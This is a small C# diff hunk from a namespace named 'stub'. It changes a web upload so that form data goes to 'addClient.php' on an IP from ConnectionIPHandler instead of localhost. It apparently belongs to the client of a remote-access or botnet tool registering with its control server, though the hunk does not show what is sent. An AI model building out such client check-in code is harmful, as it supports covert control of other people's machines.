@@ -27,7 +27,7 @@ namespace stub
                     if (!File.Exists(connection_path))
                     {
                         wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                        wc.UploadString("http://127.0.0.1/addClient.php", post);
+                        wc.UploadString("http://" + ConnectionIPHandler.GetIP() + "/addClient.php", post);
                         addclient = true;
 
 
